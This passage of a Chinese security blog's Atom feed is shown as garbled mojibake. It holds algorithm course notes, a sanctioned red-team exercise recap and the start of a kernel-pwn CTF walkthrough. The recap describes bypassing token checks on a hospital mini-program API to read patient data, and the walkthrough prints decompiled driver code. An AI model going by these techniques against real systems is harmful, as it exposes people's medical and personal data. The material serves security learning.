·çš„ä¸€é¡¹</p><p><strong>ä¿æŒé¢†å…ˆè¯æ˜è´ªå¿ƒç®—æ³•çš„ä»»æ„æ€§/æœ€ä¼˜è§£</strong>ï¼šå’Œä¸€ä¸ªå‡æƒ³çš„â€æœ€ä¼˜è§£â€ç›¸æ¯”ï¼Œé‡‡ç”¨è¯¥ç®—æ³•åœ¨æ¯ä¸€æ­¥éƒ½ä¸ä¼šè·å¾—æ›´å·®çš„ç»“æœï¼Œå³å¯è¯´æ˜è¯¥ç®—æ³•æœ€ä¼˜ï¼Œé€’æ¨è¯æ˜ï¼Œç¬¬ä¸€æ­¥â€¦ç¬¬kæ­¥éƒ½å¯¹äº†ï¼Œç¬¬k+1æ­¥ä¹Ÿæ˜¯å¯¹çš„</p><p><strong>æœ€å°åŒ–å»¶è¿Ÿè°ƒåº¦</strong>å€’ç½®ï¼Ÿ</p><blockquote><p>å¦‚æœæœ‰å€’ç½®é‚£ä¹ˆå¿…å®šæœ‰ç›¸é‚»å€’ç½®ï¼šåè¯ï¼Œå¯¹ä»»æ„ä¸€ä¸ªä¸ç›¸é‚»çš„å€’ç½®aå’Œb,é‚£ä¹ˆä¸¤è€…ä¹‹é—´å¤¹çš„ä»»åŠ¡è¦ä¹ˆå’Œaå€’ç½®è¦ä¹ˆå’Œbå€’ç½®ï¼Œè¦ä¹ˆï¼Œcæ¯”aæ—©å’Œaå‡ºç°å€’ç½®ï¼Œè¦ä¹ˆcæ¯”aæ™šå’Œbå€’ç½®ç„¶åï¼Œäº¤æ¢ä¸¤ä¸ªç›¸é‚»å€’ç½®ï¼Œä¸ä¼šå¯¹å»¶è¿Ÿæœ‰ä»»ä½•å¢å¤§çš„å˜åŒ–å¹¶ä¸”ä¼šå‡å°‘å€’ç½®</p></blockquote><p><strong>äº¤æ¢è®ºè¯è¯æ˜è´ªå¿ƒç®—æ³•çš„ä»»æ„æ€§/æœ€ä¼˜è§£:</strong> å’Œä¸€ä¸ªä»»æ„åºåˆ—ç›¸æ¯”ï¼Œé€šè¿‡æŒ‰ç…§æˆ‘ä»¬çš„è´ªå¿ƒæŒ‡æ ‡äº¤æ¢ä¸¤ä¸ªè¯¥åºåˆ—çš„å…ƒç´ è®©ç»“æœæ›´é è¿‘æˆ‘ä»¬çš„ç®—æ³•è€Œä¸”ç»“æœå¹¶ä¸ä¼šæ›´å·®ã€‚åå¤äº¤æ¢å³å¯è¯´æ˜æˆ‘ä»¬çš„ç®—æ³•æ˜¯æœ€ä¼˜è§£ã€‚åè¯è¯æ˜ï¼Œå¯¹ä»»æ„åºåˆ—æŒ‰æŒ‡æ ‡ä¸¤ä¸¤äº¤æ¢ç›´åˆ°ç»“æœæ˜¯æˆ‘ä»¬çš„è´ªå¿ƒç­–ç•¥ã€‚</p><h1>Lesson4 åˆ†æ²»</h1><p>é€’æ¨ f(n)=2f(n/2)+O(n) nlognçš„æ¥å†æ¯å±‚çš„â€œæ²»â€éƒ½æ˜¯Onåˆå¹¶ï¼Œä¸€å…±æœ‰lognå±‚ï¼Œç”»é€’å½’æ ‘</p><p>ä¸åŒçš„aå’Œbè¦ä¼šç®—æ€»çš„å¤æ‚åº¦ f(n)=af(n/b)+O(n)ï¼Œé€’æ¨</p><p>å¦‚æœæ˜¯f(n)=T(n)+O(n2)ï¼Œé‚£ä¹ˆç»“æœæ˜¯næ–¹è€Œénæ–¹logn</p><h2 id="é€†åºå¯¹è®¡ç®—">é€†åºå¯¹è®¡ç®—</h2><p>æš´åŠ›:n^2æ‰«æ</p><p>åˆ†æ²»ï¼šæ‹†å¼€ç®—ä¹‹åï¼Œå…³é”®æ˜¯ç»Ÿè®¡åˆå¹¶èµ·æ¥æœ‰å¤šå°‘é€†åºå¯¹ã€‚å…ˆæ’åºä¹‹åç„¶åæŒ‡é’ˆæ‰«æä¸€éï¼Œå› ä¸ºæ’å¥½äº†æ‰€ä»¥å³ä¾§çš„å…¨éƒ¨é€†åºï¼Œæ‰«ä¸€éOnå³å¯ã€‚</p><p>å½’å¹¶æ’åº</p><h2 id="æœ€è¿‘ç‚¹å¯¹é—®é¢˜">æœ€è¿‘ç‚¹å¯¹é—®é¢˜</h2><h2 id="ä¸»å®šç†">ä¸»å®šç†</h2><p>å¸¸è§åˆ†æ²»é€’å½’çš„é€šè§£ï¼šä¸‰ä¸ªåˆ†æ²»ç®—æ³•çš„å‚æ•°abf$T(n)=aT(n/b)+f(n)$ï¼Œåˆ†åˆ«å¯¹åº”å­é—®é¢˜æ•°é‡ï¼Œå¤§å°å‡å°è§„æ¨¡ï¼Œç»„åˆå­é—®é¢˜çš„å¤æ‚åº¦</p><p>é€šé¡¹å…¬å¼â€”â€”å‡ ä½•çº§æ•°æ±‚å’Œï¼ˆç­‰æ¯”æ•°åˆ—ï¼‰ã€‚è§pptï¼Œåˆ¤æ–­rå’Œ1çš„å¤§å°å…³ç³»ï¼Œåªå¯¹nçš„cæ¬¡å¹‚é€‚ç”¨</p><h2 id="åˆ†æ²»ä¹˜æ³•">åˆ†æ²»ä¹˜æ³•</h2><h1>Lesson5 åŠ¨æ€è§„åˆ’DP</h1><blockquote><p>è§£è¿‡çš„ä¸è¦å†è§£</p></blockquote><h2 id="åŠ æƒåŒºé—´è°ƒåº¦">åŠ æƒåŒºé—´è°ƒåº¦</h2><p>æ‰¾æœ€å¤§æƒé‡å­é›†ã€‚æˆ‘ä»¬æ²¡æœ‰é€šé¡¹ï¼Œä½†æ˜¯å¸Œæœ›èƒ½ç”¨ç›®æ ‡ç»“æœçš„æ›´å°ä¸‹æ ‡çš„é€’æ¨å¼è¡¨ç¤º</p><p>é€‰æ‹©ç¬¬jé¡¹ï¼Ÿä¸é€‰ç¬¬jé¡¹ï¼Ÿé€ä¸ªç¼©å‡é—®é¢˜è§„æ¨¡ã€‚æˆ‘ä»¬æ€»æ˜¯å¸Œæœ›å°†OPT(n)ç”¨1-n-1è¡¨ç¤ºï¼Œç„¶åå¯¹nè®¨è®ºã€‚</p><h3 id="æš´åŠ›">æš´åŠ›</h3><p>æœ¬è´¨æ˜¯æœ‰ä¸€äº›é¡ºåºçš„æšä¸¾ã€‚æœ€å¥½æœ€åæƒ…å†µï¼Ÿèƒ½ç¼©å‡æ›´å¤šè§„æ¨¡çš„æœºä¼š æœ€å·®$2^n$ï¼Œé€’å½’äºŒå‰æ ‘</p><h3 id="è‡ªé¡¶å‘ä¸‹åŠ¨æ€è§„åˆ’ï¼ˆå¤‡å¿˜å½•ï¼‰">è‡ªé¡¶å‘ä¸‹åŠ¨æ€è§„åˆ’ï¼ˆå¤‡å¿˜å½•ï¼‰</h3><p>æ¨¡æ‹Ÿä¸€æ¬¡é€’å½’è¿”å›çš„è¿‡ç¨‹ã€‚æš‚å­˜å­é—®é¢˜jçš„ç»“æœåœ¨M[j]ä¸­ï¼Œç“¶é¢ˆåœ¨æ’åºï¼Œæœ€åå°±éå†ä¸€éå°±è¡Œäº†ã€‚</p><h2 id="èƒŒåŒ…é—®é¢˜">èƒŒåŒ…é—®é¢˜</h2><p>è´ªå¿ƒçš„æ ¸å¿ƒæ˜¯æ’åºæŒ‡æ ‡ï¼ŒDPçš„æ ¸å¿ƒæ˜¯å®šä¹‰é‡å å­é—®é¢˜</p><p>åŒæ—¶è€ƒè™‘ç‰©å“å’ŒåŒ…é‡é‡ã€‚å¦‚æœä¸é€‰i,é‚£å°±æ˜¯<code>OPT(i-1,w)</code>ï¼Œå¦‚æœé€‰äº†ï¼Œå°±å¯¹åº”ç¼©å°åŒ…çš„ç©ºé—´<code>OPT(I-1,w-wi)+Vi</code>ã€‚å¡«ä¸€å¼ äºŒç»´çš„è¡¨</p><p>å›æº¯çœ‹æ¥æºï¼Œæ—¶é—´å¤æ‚åº¦$O(nW)$ï¼ŒWæ˜¯è¾“å…¥çš„å˜é‡ï¼Œä¸ä»£è¡¨ä»–å…³äºnæ˜¯å¤šé¡¹å¼æ—¶é—´ã€‚ä½†æ˜¯ç®—æ³•ä¸¥é‡ä¾èµ–äºé‡é‡æ˜¯æ•´æ•°çš„å‡è®¾ã€‚</p><h2 id="å­—ç¬¦ä¸²å¯¹é½">å­—ç¬¦ä¸²å¯¹é½</h2><h1>Lesson6 æœ€å°æµå’Œæœ€å¤§å‰²</h1><p>å¹¶æŸ¥é›†ï¼Ÿï¼Ÿå”‰</p><h1>LessonN çº¿æ®µæ ‘</h1><p>å †å¼å­˜å‚¨ æŸ¥è¯¢2lognæ±‚å’Œ</p><p>Lazy Tag å¯¹ä¸Šè´Ÿè´£ï¼Ÿ</p><p>æ¯ä¸€è¡Œæœ€å¤šåªæœ‰ä¸¤ä¸ªè“è‰²åŒºé—´å’Œ2ä¸ªçº¢è‰²åŒºé—´</p><p>æ‰¹é‡ä¿®æ”¹ä¼šåœ¨èƒ½è¦†ç›–çš„åœ°æ–¹å°±åœï¼Œç„¶åç›´åˆ°ä¸‹æ¬¡æŸ¥è¯¢å†ä¿®æ”¹ã€‚</p><p>å¤šä¸ªlazy tag,ä¼˜å…ˆé«˜çš„å…ˆä¸‹ä¼ </p><p>ç»Ÿè®¡é‡å¯åˆå¹¶å¯ä»¥ä½¿ç”¨</p><h2 id="æ ‘çŠ¶æ•°ç»„">æ ‘çŠ¶æ•°ç»„</h2><p>æ— éœ€é¢å¤–ç©ºé—´ é•¿åº¦ä»ç„¶n<br>ä¿®æ”¹å¯¹åº”ä½ç½® çº¿æ®µæ ‘åŠ å‰ç¼€</p><h1>Lesson N+1 kmpç®—æ³•â€”â€”å­—ç¬¦ä¸²åŒ¹é…</h1><p>ä¾æ®ä¸€å¼ éƒ¨åˆ†åŒ¹é…è¡¨å¿«é€Ÿè·³è¿‡$O(m+n)$</p><h1>å¤šé¡¹å¼æ—¶é—´è§„çº¦</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;C++æ¨¡æ¿åº“çš„ä½¿ç”¨&lt;/h1&gt;
&lt;p&gt;ä¸»è¦åŒ…æ‹¬ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li class=&quot;lvl-3&quot;&gt;åºåˆ—å¼å®¹å™¨ï¼šarrayï¼ˆå®šé•¿ï¼‰ï¼Œvectorï¼ˆå•å‘æ’å…¥ï¼‰ï¼Œdequeï¼ˆåŒå‘æ’å…¥ï¼‰ï¼Œlistï¼ˆåŒå‘é“¾è¡¨ï¼‰ï¼Œforwardlistï¼ˆå•å‘é“¾è¡¨ï¼‰&lt;/li&gt;
&lt;li class=</summary>
      
    
    
    
    
    <category term="ç®—æ³•" scheme="https://zjw1nd.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>è®°å½•ä¸€æ¬¡æŠ¤ç½‘è¡ŒåŠ¨</title>
    <link href="https://zjw1nd.github.io/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/"/>
    <id>https://zjw1nd.github.io/2024/10/18/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/</id>
    <published>2024-10-18T11:17:47.000Z</published>
    <updated>2024-10-19T03:32:36.416Z</updated>
    
    <content type="html"><![CDATA[<h1>å†™åœ¨å‰é¢</h1><p>é¦–å…ˆè¿™æ¬¡çš„ä½“éªŒå°±ä¸¤ä¸ªå­—ï¼š<strong>åç‰¢</strong>ã€‚å…ˆä¸è¯´ä¼šä¸ä¼šèƒ½ä¸èƒ½æ‰“ï¼Œæ•´ä¸ªæ‰¿åŠä½“éªŒæå·®ã€‚æ”¶æ‰‹æœºï¼ˆä¸ºæ­¤è¿˜å‰ä¸€å¤©æ”¶äº†ä¸€éƒ¨ï¼Œèµ·äº†å¤§ä½œç”¨äº†ï¼‰ã€‚é™¤äº†æ”¶æ‰‹æœºä»¥å¤–ï¼Œè¿˜ä¸è®©ç”¨è‡ªå·±çš„ç”µè„‘ï¼Œç»™çš„ç”µè„‘é…ç½®å¾ˆå·®ï¼Œç©ºé—´ä¹Ÿå°±è£…ä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¿˜è¦æ¢¯å­ï¼Œåæ­£å°±æ˜¯æ¶å¿ƒå®Œäº†ã€‚</p><h1>Webæ¸—é€å¤§æ¦‚è®°å½•ä¸€ä¸‹</h1><blockquote><p>â€œå†…ç½‘æ¸—é€çš„æœ¬è´¨æ˜¯ä¿¡æ¯æœé›†â€</p></blockquote><p>é¦–å…ˆæ„Ÿè°¢xzjå¸ˆå‚…çš„å·¥å…·ã€‚Webæ–¹å‘çš„å·¥å…·ä¹Ÿå¤ªå¤šäº†ï¼Œç”šè‡³è¿˜æœ‰é›†æˆå¥½çš„è™šæ‹Ÿæœºç¯å¢ƒï¼Œå„ä¸ªGUIåšçš„éƒ½ç‰›é€¼çš„ä¸è¡Œï¼ˆYakitï¼‰ï¼Œä¸€é”®æ‰«æä¸€é”®æœé›†ä¸€é”®æµ‹pocï¼Œæ„Ÿå¹webåƒçš„ä¹Ÿå¤ªå¥½äº†ã€‚</p><h2 id="å·¥å…·">å·¥å…·</h2><p>æœ€åæäº†åŠå¤©å°±bpæœ€ç†Ÿï¼Œå¦ä¸€ä¸ªç”¨çš„æœ€å¤šçš„å°±æ˜¯è½»é‡åŒ–çš„dudesuiteï¼Œfofaå’Œé‡æ”¾å°±å¤Ÿäº†ã€‚ä¿¡æ¯æœé›†å¯†æ¢ä¼¼ä¹æœ€å¥½ç”¨å¯æƒœåæœŸæ‰å‘ç°ã€‚awvsçœ‹èµ·æ¥ä¹Ÿç‰›é€¼ä½†æ˜¯æ²¡ç”¨åˆ°ã€‚</p><h2 id="ä»£ç†æ± ">ä»£ç†æ± </h2><p>ç¬¬ä¸€å¤©æ²¡ä»€ä¹ˆè¿›å±•ï¼Œä¸­åŒ»é™¢çš„OAæŒ‡çº¹è¯†åˆ«åæµ‹POCå‘ä¸¤æ¬¡å°±è¢«ban ipï¼Œä¸æ‡‚è¿˜ä»¥ä¸ºæ˜¯ç©ä¸èµ·ï¼Œåæ¥é—®å­¦é•¿å’Œè£åˆ¤æ‰äº†è§£åˆ°åº”è¯¥æ˜¯ç‰©ç†çš„å°ç›’WAFã€‚ä¸èµ°åŸŸåçš„è¯æµ‹pocè¢«banä¸€èˆ¬å°±è¦ä¹ˆé…ä»£ç†æ± è¦ä¹ˆæ¢ç›®æ ‡äº†ã€‚</p><p>ä»£ç†æ± åˆæŠ˜è…¾äº†å‡ å¤©ï¼Œå¼€å§‹è¯´è¦ä¸€ä¸ªvpsæ¥ï¼Œè¦æ¥äº†ä¹Ÿæ²¡å•¥ç”¨ï¼ŒCentOSä¸Šé¢ä»€ä¹ˆä¹Ÿæ²¡æœ‰è‡ªå·±è¿˜å¾—é…ç¯å¢ƒï¼Œæ‰‹åŠ¨ç¼–è¯‘pythonè£…ä¸€å¹´è£…å¥½äº†è¿˜ä¸èƒ½ç”¨ä¸€æ‹–å²ã€‚æ•´ä¸ªæ”»å‡»çš„ç½‘ç»œéƒ½æ˜¯å†…ç½‘ï¼Œå‡ºå£ipä¸€æ ·ï¼Œæ²¡æœ‰ipv6ç½‘æ®µï¼Œv4çš„å…¬ç½‘ipè‡ªå·±å°±ä¸èƒ½ä¹±å†™äº†ã€‚ç¬¬ä¸‰å¤©å¤§éƒ¨åˆ†æ—¶é—´åœ¨æŠ˜è…¾è¿™ä¸ªï¼Œç»ˆäºæ”¾å¼ƒäº†ï¼Œä»ç½‘ä¸Šä¹°æ–°ç”¨æˆ·ç™½å«–çš„æ¥å‘åŒ…æµ‹pocï¼ˆåˆ°ä¸­æœŸéƒ½æ²¡æœ‰èƒ½ç›´è¿è®¿é—®çš„äº†ï¼Œè¦ä¹ˆå¼€è‡ªå·±æ¢¯å­è¦ä¹ˆä»£ç†æ± ï¼‰ã€‚</p><h2 id="æˆæœ">æˆæœ</h2><p>ç¬¬äºŒå¤©ä»å­¦é•¿äº†è§£åˆ°ä¸Šæ¬¡ä¸­åŒ»é™¢æŒ–äº†å°ç¨‹åºçš„è¶Šæƒã€‚è¿™æ¬¡ä¹Ÿè¯•è¯•ï¼Œä¸»è¦ç›®æ ‡éƒ½é˜²æŠ¤å¤ªå‰å®³äº†ã€‚ç„¶åå­¦äº†ä¸€æ‰‹å°ç¨‹åºæŠ“åŒ…ï¼ˆProxifierä»£ç†æœ‰ç‚¹å‰å®³ï¼Œè¿›ç¨‹æŒ‡å®šï¼‰ï¼Œç„¶åå¼€å§‹äººå·¥å®¡è®¡æµé‡ï¼ˆä¸Šæ¬¡ä¹Ÿæ˜¯è¿™ä¹ˆå¹²çš„ï¼‰ã€‚æ²¡æƒ³åˆ°è¿˜çœŸè®©æˆ‘å®¡åˆ°äº†ï¼Œå„ä¸ªæ¥å£ä¸€ä¸ªä¸ªä¹±è¯•çš„æ—¶å€™å‘ç°ï¼ŒæŸ¥åœ°å€çš„æ—¶å€™å°±ç®—æŠŠTokenå­—æ®µå…¨åˆ æ‰ä¹Ÿè¿”å›200ï¼Œæµ‹è¯•äº†ä¸€ä¸‹æœç„¶ï¼Œåªè®¤GETé‡Œçš„UserIdæ‰‹æœºå·ï¼Œtokenæ˜¯å‡çš„â€¦é‚å–Šäººæ³¨å†ŒéªŒè¯ï¼Œæœç„¶å¹³è¡Œè¶Šæƒéšä¾¿æŸ¥ã€‚å„ä¸ªæ¥å£æµ‹ä¸€éä¸‹æ¥ï¼Œåªæœ‰å…³è”çš„å°±è¯Šäººè¿™ä¸ªæœ€æ•æ„Ÿçš„ï¼ˆèº«ä»½è¯ï¼‰æœ‰éªŒè¯ï¼Œåœ°å€å’Œå°±è¯Šè®°å½•éƒ½ä¸çœ‹Tokenï¼Œå¤ªæŠ½è±¡äº†ã€‚<br><img src="/images/hvv/poc1.png" alt="poc1.png"></p><p><img src="/images/hvv/poc2.png" alt="poc2.png"></p><p>äº¤æ¶‰3å¤©åæ‹¿åˆ°1500åˆ†ï¼ŒæŒ‰200w+çš„æ•°æ®ç®—äº†ï¼Œæœ€åä¹Ÿæ¯”æ­¦å¤§é«˜ï¼Œå°win</p><p>æœ€åç»å¤§éƒ¨åˆ†è¿˜æ˜¯å…ˆå¼±å£ä»¤/ç¤¾å·¥/é’“é±¼çš„å†…ç½‘çªç ´ï¼Œå°±ç®—æ²¡æœ‰è¿™äº›ä¹Ÿå¤§éƒ¨åˆ†éƒ½æ˜¯å¼±å£ä»¤æ‹¿åˆ†ã€‚æˆ‘ä»¬ä¸€ä¸ªéƒ½æ²¡æ‰¾åˆ°ï¼Œå‘ç°çš„éƒ½åƒæ˜¯èœœç½ã€‚</p><h1>anyway</h1><p>ä¸ç†Ÿæ‚‰ä»»ä½•çš„å¸¸è§æ¡†æ¶ï¼Œwebfuzzï¼Œæ¼æ´æŒ–æ˜ï¼Œä»£ç å®¡è®¡ã€‚äººå·¥å®¡å°ç¨‹åºç¡¬æ˜¯æ‹¿äº†1500ä¹Ÿç®—ä¸é”™äº†ã€‚ä¸»è¦è¿˜æ˜¯ä¸ç†Ÿæ‚‰çœŸå®çš„æ¸—é€æµç¨‹å’Œä½“ç³»åŒ–çš„é‚£ç§æ“ä½œã€‚å¯†æ¢é‡Œæœ‰ä¸€å¼ å¤‡å¿˜å›¾å°±å¾ˆå¥½ã€‚ä¿¡æ¯æœé›†è¯¥å¹²ä»€ä¹ˆï¼Œç½‘ç«™æ‹¿åˆ°äº†æ ¹æ®æ³¨å†Œæ¡†ã€æ•æ„Ÿä¿¡æ¯ç­‰ç­‰æˆ‘ä»¬èƒ½åšä»€ä¹ˆæ”»å‡»æµ‹è¯•ï¼Œæœ‰æ¼æ´ä¹‹åæ€ä¹ˆåˆ©ç”¨æœ€åè¿›å…¥å†…ç½‘ç­‰ç­‰ã€‚å‰æœŸçš„å‡†å¤‡å’Œä¿¡æ¯æœé›†å¤ªå°‘äº†åŸºæœ¬æ˜¯æ— å¤´è‹è‡ï¼Œåœ¨æ²¡ç”¨çš„åœ°æ–¹æµªè´¹äº†å¾ˆå¤šæ—¶é—´ã€‚è¿˜å¾—æ˜¯å¿«é€Ÿæ‰¾å¼±å£ä»¤çªç ´å£ï¼Œå¦å¤–æ•™ç¨‹å¾—æ‰¾åŒæ ·çš„æŠ¤ç½‘è®°å½•ç»™æ€è·¯ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;å†™åœ¨å‰é¢&lt;/h1&gt;
&lt;p&gt;é¦–å…ˆè¿™æ¬¡çš„ä½“éªŒå°±ä¸¤ä¸ªå­—ï¼š&lt;strong&gt;åç‰¢&lt;/strong&gt;ã€‚å…ˆä¸è¯´ä¼šä¸ä¼šèƒ½ä¸èƒ½æ‰“ï¼Œæ•´ä¸ªæ‰¿åŠä½“éªŒæå·®ã€‚æ”¶æ‰‹æœºï¼ˆä¸ºæ­¤è¿˜å‰ä¸€å¤©æ”¶äº†ä¸€éƒ¨ï¼Œèµ·äº†å¤§ä½œç”¨äº†ï¼‰ã€‚é™¤äº†æ”¶æ‰‹æœºä»¥å¤–ï¼Œè¿˜ä¸è®©ç”¨è‡ªå·±çš„ç”µè„‘ï¼Œç»™çš„ç”µè„‘é…ç½®å¾ˆå·®ï¼Œç©ºé—´ä¹Ÿå°±è£…ä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¿˜è¦æ¢¯å­ï¼Œåæ­£å°±æ˜¯æ¶</summary>
      
    
    
    
    <category term="Web" scheme="https://zjw1nd.github.io/categories/Web/"/>
    
    
    <category term="web" scheme="https://zjw1nd.github.io/tags/web/"/>
    
    <category term="hvv" scheme="https://zjw1nd.github.io/tags/hvv/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘å…¥é—¨ä¹‹2015-AliCrackme</title>
    <link href="https://zjw1nd.github.io/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/"/>
    <id>https://zjw1nd.github.io/2024/10/14/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E4%B9%8B2015-AliCrackme/</id>
    <published>2024-10-14T11:18:51.000Z</published>
    <updated>2024-11-20T06:31:44.034Z</updated>
    
    <content type="html"><![CDATA[<h1>å‚è€ƒå®éªŒæŠ¥å‘Š</h1><p>ç®€å•çš„åˆ†æï¼Œå†…å­˜dumpæˆ–è€…åè°ƒè¯•patchã€‚å¤šç”¨ddç›´æ¥dumpå†…å­˜</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;å‚è€ƒå®éªŒæŠ¥å‘Š&lt;/h1&gt;
&lt;p&gt;ç®€å•çš„åˆ†æï¼Œå†…å­˜dumpæˆ–è€…åè°ƒè¯•patchã€‚å¤šç”¨ddç›´æ¥dumpå†…å­˜&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Android" scheme="https://zjw1nd.github.io/tags/Android/"/>
    
    <category term="é€†å‘" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Kernel Pwnä»å…¥é—¨åˆ°å…¥åœŸ-2</title>
    <link href="https://zjw1nd.github.io/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/"/>
    <id>https://zjw1nd.github.io/2024/10/11/Kernel-Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-2/</id>
    <published>2024-10-11T08:28:17.000Z</published>
    <updated>2024-11-20T07:46:49.673Z</updated>
    
    <content type="html"><![CDATA[<h1>é¢˜ç›®åˆ†æ</h1><p>initå’Œexitæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šå†…å®¹ï¼Œå°±æ˜¯æ­£å¸¸çš„æ³¨å†Œå’Œææ„ã€‚æ³¨å†Œäº†ä¸€ä¸ªåå«<code>babydev</code>çš„å­—ç¬¦è®¾å¤‡ã€‚</p><p>è¿™é“é¢˜åœ¨bssæœ‰ä¸€ä¸ªå…¨å±€å˜é‡ï¼ŒåŒ…å«äº†ä¸€ä¸ªbufæŒ‡é’ˆå’Œä¸€ä¸ªé•¿åº¦å­—æ®µã€‚ä¸‹é¢çœ‹çœ‹è¿™ä¸ªé©±åŠ¨åœ¨å¹²å˜›ï¼š</p><h2 id="init-sh-qemuå‚æ•°ï¼š">init.sh-qemuå‚æ•°ï¼š</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio </span><br><span class="line">-kernel bzImage </span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> </span><br><span class="line">-enable-kvm </span><br><span class="line">-monitor /dev/null </span><br><span class="line">-m 64M </span><br><span class="line">--nographic </span><br><span class="line">-smp cores=1,threads=1 </span><br><span class="line">-cpu kvm64,+smep <span class="comment"># å¼€å¯äº†smep</span></span><br></pre></td></tr></table></figure><h2 id="open">open</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">babyopen</span><span class="params">(inode *inode, file *filp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(inode, filp);<span class="comment">//</span></span><br><span class="line">  babydev_struct.device_buf = (<span class="type">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fentryä¸ç”¨ç®¡ï¼Œæ˜¯ç¼–è¯‘çš„æ—¶å€™gccåœ¨å‡½æ•°å…¥å£æ’å…¥çš„ä¸œè¥¿ã€‚</p><p>openè¿™ä¸ªé©±åŠ¨ä¼šå°†bufåˆå§‹åŒ–, è°ƒç”¨<code>kmem_cache_alloc_trace</code>åˆ†é…ä¸€ä¸ª0x40çš„objectã€‚è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯æŠ½è±¡å¥½å‡ å±‚åçš„äº†ï¼Œæˆ‘ä»¬åé¢å†è°ˆlinuxå†…æ ¸çš„å†…å­˜åˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="type">void</span> *<span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line">ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="readå’Œwrite">readå’Œwrite</h2><p>æ²¡ä»€ä¹ˆå·®åˆ«ï¼Œç›´æ¥å¤åˆ¶æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  result = <span class="number">-2LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    <span class="keyword">return</span> v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 